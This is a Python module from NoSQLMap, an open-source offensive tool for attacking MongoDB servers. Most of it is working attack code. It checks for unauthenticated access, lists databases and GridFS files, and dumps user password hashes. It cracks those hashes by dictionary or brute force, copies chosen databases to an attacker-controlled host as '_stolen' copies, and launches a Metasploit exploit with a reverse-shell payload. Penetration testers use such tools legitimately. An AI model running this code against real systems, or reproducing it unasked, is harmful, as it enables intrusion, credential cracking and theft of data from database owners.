#!/usr/bin/env python3
# NoSQLMap Copyright 2012-2017 NoSQLMap Development team
# See the file 'doc/COPYING' for copying permission

from .exception import NoSQLMapException
import pymongo
import urllib.request
import urllib.parse
import urllib.error
import json
import gridfs
import itertools
import string
import subprocess
import hashlib
from hashlib import md5
import hmac
import base64
import os


global yes_tag
global no_tag
yes_tag = ['y', 'Y']
no_tag = ['n', 'N']

def args():
    return []

def netAttacks(target, dbPort, myIP, myPort, args = None):
    print("DB Access attacks (MongoDB)")
    print("=================")
    mgtOpen = False
    webOpen = False
    mgtSelect = True
    # This is a global for future use with other modules; may change
    global dbList
    dbList = []

    print("Checking to see if credentials are needed...")
    needCreds = mongoScan(target,dbPort,False)

    if needCreds[0] == 0:
        conn = pymongo.MongoClient(target, dbPort, serverSelectionTimeoutMS=4000)
        print("Successful access with no credentials!")
        mgtOpen = True

    elif needCreds[0] == 1:
        print("Login required!")
        srvUser = input("Enter server username: ")
        srvPass = input("Enter server password: ")
        uri = "mongodb://" + urllib.parse.quote_plus(srvUser) + ":" + urllib.parse.quote_plus(srvPass) + "@" + target + ":" + str(dbPort) + "/"

        try:
            conn = pymongo.MongoClient(uri, serverSelectionTimeoutMS=4000)
            # MongoClient is lazy; force an authenticated round-trip so we only
            # report success when the credentials actually work.
            conn.admin.command("ping")
            print("MongoDB authenticated on " + target + ":" + str(dbPort) + "!")
            mgtOpen = True
        except pymongo.errors.PyMongoError:
            input("Failed to authenticate.  Press enter to continue...")
            return

    elif needCreds[0] == 2:
        conn = pymongo.MongoClient(target, dbPort, serverSelectionTimeoutMS=4000)
        print("Access check failure.  Testing will continue but will be unreliable.")
        mgtOpen = True

    elif needCreds[0] == 3:
        print("Couldn't connect to Mongo server.")
        return


    mgtUrl = "http://" + target + ":28017"
    # Future rev:  Add web management interface parsing

    try:
        mgtRespCode = urllib.request.urlopen(mgtUrl, timeout=5).getcode()
        if mgtRespCode == 200:
            print("MongoDB web management open at " + mgtUrl + ".  No authentication required!")
            testRest = input("Start tests for REST Interface (y/n)? ")

            if testRest in yes_tag:
                restUrl = mgtUrl + "/listDatabases?text=1"
                restResp = urllib.request.urlopen(restUrl, timeout=5).read().decode()
                restOn = restResp.find('REST is not enabled.')

                if restOn == -1:
                    print("REST interface enabled!")
                    dbs = json.loads(restResp)
                    menuItem = 1
                    print("List of databases from REST API:")

                    for x in range(0,len(dbs['databases'])):
                        dbTemp= dbs['databases'][x]['name']
                        print(str(menuItem) + "-" + dbTemp)
                        menuItem += 1
                else:
                    print("REST interface not enabled.")
                print("\n")

    except (urllib.error.URLError, urllib.error.HTTPError, OSError, json.JSONDecodeError, KeyError, IndexError, TypeError):
        print("MongoDB web management closed or requires authentication.")

    if mgtOpen == True:

        while mgtSelect:
            print("\n")
            print("1-Get Server Version and Platform")
            print("2-Enumerate Databases/Collections/Users")
            print("3-Check for GridFS")
            print("4-Clone a Database")
            print("5-Launch Metasploit Exploit for Mongo < 2.2.4")
            print("6-Return to Main Menu")
            attack = input("Select an attack: ")

            if attack == "1":
                print("\n")
                getPlatInfo(conn)

            if attack == "2":
                print("\n")
                enumDbs(conn)

            if attack == "3":
                print("\n")
                enumGrid(conn)

            if attack == "4":
                print("\n")
                stealDBs(myIP,target,conn)

            if attack == "5":
                print("\n")
                msfLaunch(target, myIP, myPort)

            if attack == "6":
                return


def stealDBs(myDB,victim,mongoConn):
    dbList = mongoConn.list_database_names()
    menuItem = 1

    if len(dbList) == 0:
        print("Can't get a list of databases to steal.  The provided credentials may not have rights.")
        return

    for dbName in dbList:
        print(str(menuItem) + "-" + dbName)
        menuItem += 1

    while True:
        dbLoot = input("Select a database to steal: ")
        if dbLoot.isdigit() and 1 <= int(dbLoot) < menuItem:
            break
        print("Invalid selection.")

    try:
        # Clone destination is a MongoDB you control.  Default to the configured
        # listener IP but let the operator override host and port (the old code
        # silently reused the shell-listener IP and hardcoded port 27017).
        destHost = input("Destination MongoDB host [" + str(myDB) + "]: ").strip() or str(myDB)
        destPort = input("Destination MongoDB port [27017]: ").strip() or "27017"
        myDBConn = pymongo.MongoClient(destHost, int(destPort), serverSelectionTimeoutMS=4000)

        # copy_database was removed in PyMongo 4.x; copy collections manually,
        # reusing the already-authenticated source connection.
        srcDBName = dbList[int(dbLoot)-1]
        dstDBName = srcDBName + "_stolen"
        srcDB = mongoConn[srcDBName]
        dstDB = myDBConn[dstDBName]

        for coll_name in srcDB.list_collection_names():
            if coll_name.startswith('system.'):
                continue
            docs = list(srcDB[coll_name].find())
            if docs:
                dstDB[coll_name].insert_many(docs)

        myDBConn.close()

        cloneAnother = input("Database cloned.  Copy another (y/n)? ")
        if cloneAnother in yes_tag:
            stealDBs(myDB,victim,mongoConn)
        else:
            return

    except ValueError:
        input("Invalid destination port.  Press enter to return...")
        return
    except pymongo.errors.PyMongoError as e:
        input("Something went wrong cloning the database (" + str(e) + ").  Press enter to return...")
        return


def passCrack (user, cred):
    select = True
    print("Select password cracking method: ")
    print("1-Dictionary Attack")
    print("2-Brute Force")
    print("3-Exit")


    while select:
        select = input("Selection: ")
        if select == "1":
            select = False
            dict_pass(user, cred)

        elif select == "2":
            select = False
            brute_pass(user, cred)

        elif select == "3":
            return
    return


def _check_pw(user, candidate, cred):
    # cred is either a legacy MONGODB-CR md5 hex string, or a SCRAM credential
    # dict {'mech','salt','iterations','storedKey'} from a modern user document.
    if isinstance(cred, dict):
        return _scram_match(user, candidate, cred)
    return md5((user + ":mongo:" + str(candidate)).encode()).hexdigest() == cred


def _scram_match(user, candidate, cred):
    # Recompute the SCRAM storedKey for a candidate and compare.  MongoDB's
    # SCRAM-SHA-1 uses the hex MONGODB-CR digest as the PBKDF2 secret, while
    # SCRAM-SHA-256 uses the (SASLprep'd) password directly.
    try:
        salt = base64.b64decode(cred["salt"])
        iterations = int(cred["iterations"])
        if cred.get("mech") == "SCRAM-SHA-256":
            secret = str(candidate).encode("utf-8")
            algo = "sha256"
        else:
            secret = md5((user + ":mongo:" + str(candidate)).encode()).hexdigest().encode("utf-8")
            algo = "sha1"
        salted = hashlib.pbkdf2_hmac(algo, secret, salt, iterations)
        clientKey = hmac.new(salted, b"Client Key", algo).digest()
        storedKey = hashlib.new(algo, clientKey).digest()
        return base64.b64encode(storedKey).decode() == cred["storedKey"]
    except (ValueError, KeyError, TypeError):
        return False


def _extract_cred(userDoc):
    # Return a legacy MONGODB-CR md5 hex string, a SCRAM cred dict, or None.
    if "pwd" in userDoc:
        return userDoc["pwd"]
    creds = userDoc.get("credentials", {})
    for mech in ("SCRAM-SHA-256", "SCRAM-SHA-1"):
        if mech in creds:
            c = creds[mech]
            return {
                "mech": mech,
                "salt": c.get("salt", ""),
                "iterations": int(c.get("iterationCount", 0)),
                "storedKey": c.get("storedKey", ""),
            }
    return None


def gen_pass(user, passw, cred):
    if _check_pw(user, passw, cred):
        print("Found - " + user + ":" + passw)
        return True
    else:
        return False


def dict_pass(user, cred):
    loadCheck = False

    while loadCheck == False:
        dictionary = input("Enter path to password dictionary: ")
        try:
            with open (dictionary) as f:
                   passList = f.readlines()
            loadCheck = True
        except OSError:
            print(" Couldn't load file.")

    print("Running dictionary attack...")
    for passGuess in passList:
        temp = passGuess.rstrip("\n")
        gotIt = gen_pass (user, temp, cred)

        if gotIt == True:
            break
    return


def genBrute(chars, maxLen):
    return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)))


def brute_pass(user, cred):
    print("\n")
    maxLen = input("Enter the maximum password length to attempt: ")
    print("1-Lower case letters")
    print("2-Upper case letters")
    print("3-Upper + lower case letters")
    print("4-Numbers only")
    print("5-Alphanumeric (upper and lower case)")
    print("6-Alphanumeric + special characters")
    charSel = input("\nSelect character set to use:")

    if charSel == "1":
        chainSet = string.ascii_lowercase

    elif charSel == "2":
        chainSet= string.ascii_uppercase

    elif charSel == "3":
        chainSet = string.ascii_letters

    elif charSel == "4":
        chainSet = string.digits

    elif charSel == "5":
        chainSet = string.ascii_letters + string.digits

    elif charSel == "6":
        chainSet = string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"

    else:
        print("Invalid character set selection.")
        return

    if not maxLen.isdigit():
        print("Maximum length must be a number.")
        return

    count = 0
    print("\n", end="")
    for attempt in genBrute (chainSet,int(maxLen)):
        print("\rCombinations tested: " + str(count), end="")
        count += 1
        if _check_pw(user, attempt, cred):
            print("\nFound - " + user + ":" + attempt)
            break
    return


def getPlatInfo (mongoConn):
    print("Server Info:")
    try:
        info = mongoConn.server_info()
        print("MongoDB Version: " + str(info.get('version', 'unknown')))
        print("Debugs enabled : " + str(info.get('debug', False)))
        print("Platform: " + str(info.get('bits', '?')) + " bit")
    except pymongo.errors.PyMongoError as e:
        print("Couldn't retrieve server info: " + str(e))
    print("\n")
    return


def enumDbs (mongoConn):
    try:
        print("List of databases:")
        print("\n".join(mongoConn.list_database_names()))
        print("\n")

    except pymongo.errors.PyMongoError:
        print("Error:  Couldn't list databases.  The provided credentials may not have rights.")

    print("List of collections:")

    try:
        for dbItem in mongoConn.list_database_names():
            db = mongoConn[dbItem]
            print(dbItem + ":")
            print("\n".join(db.list_collection_names()))
            print("\n")

            if 'system.users' in db.list_collection_names():
                users = list(db.system.users.find())
                print("Database Users and Password Hashes:")

                for user in users:
                    uname = user.get('user', '?')
                    cred = _extract_cred(user)
                    print("Username: " + uname)
                    if cred is None:
                        print("Hash: (unrecognised credential format)")
                        print("\n")
                        continue
                    if isinstance(cred, str):
                        print("Hash (MONGODB-CR): " + cred)
                    else:
                        print("Credential: " + cred['mech'] + " iterations=" + str(cred['iterations']))
                        print("storedKey: " + cred['storedKey'] + "  salt: " + cred['salt'])
                    print("\n")
                    crack = input("Crack this hash (y/n)? ")

                    if crack in yes_tag:
                        passCrack(uname, cred)

    except pymongo.errors.PyMongoError as e:
        print(e)
        print("Error:  Couldn't list collections.  The provided credentials may not have rights.")

    print("\n")
    return


def msfLaunch(victim, myIP, myPort):
    # msfcli was removed from Metasploit in 2015; drive msfconsole instead.
    resource = ("use exploit/linux/misc/mongod_native_helper; "
                "set RHOST %s; set DB local; "
                "set PAYLOAD linux/x86/shell/reverse_tcp; "
                "set LHOST %s; set LPORT %s; run" % (victim, myIP, myPort))
    try:
        subprocess.call(["msfconsole", "-q", "-x", resource])

    except (OSError, subprocess.SubprocessError):
        print("Something went wrong.  Make sure Metasploit (msfconsole) is installed and on PATH, and all options are defined.")
    input("Press enter to continue...")
    return


def enumGrid (mongoConn):
    try:
        for dbItem in mongoConn.list_database_names():
            try:
                db = mongoConn[dbItem]
                fs = gridfs.GridFS(db)
                # GridFS.list() was removed in PyMongo 4; enumerate via find().
                files = [f.filename for f in fs.find() if getattr(f, 'filename', None)]
                if files:
                    print("GridFS enabled on database " + str(dbItem))
                    print(" list of files:")
                    print("\n".join(files))
                else:
                    print("GridFS not enabled on " + str(dbItem) + ".")

            except pymongo.errors.PyMongoError:
                print("GridFS not enabled on " + str(dbItem) + ".")

    except pymongo.errors.PyMongoError:
        print("Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights.")

    return


def mongoScan(ip,port,pingIt):

    if pingIt == True:
        # argv form (no shell) so a hostile entry in a scanned IP list cannot
        # inject shell commands onto the operator's box.
        test = subprocess.call(["ping", "-c", "1", "-n", "-W", "1", ip],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if test != 0:
            return [4, None]

    try:
        conn = pymongo.MongoClient(ip, port, connectTimeoutMS=4000, socketTimeoutMS=4000, serverSelectionTimeoutMS=4000)
        dbList = conn.list_database_names()
        dbVer = conn.server_info()['version']
        conn.close()
        return [0, dbVer]

    except pymongo.errors.OperationFailure:
        # Authentication required / not authorized.
        return [1, None]

    except (pymongo.errors.ServerSelectionTimeoutError, pymongo.errors.ConnectionFailure):
        return [3, None]

    except pymongo.errors.PyMongoError:
        return [2, None]
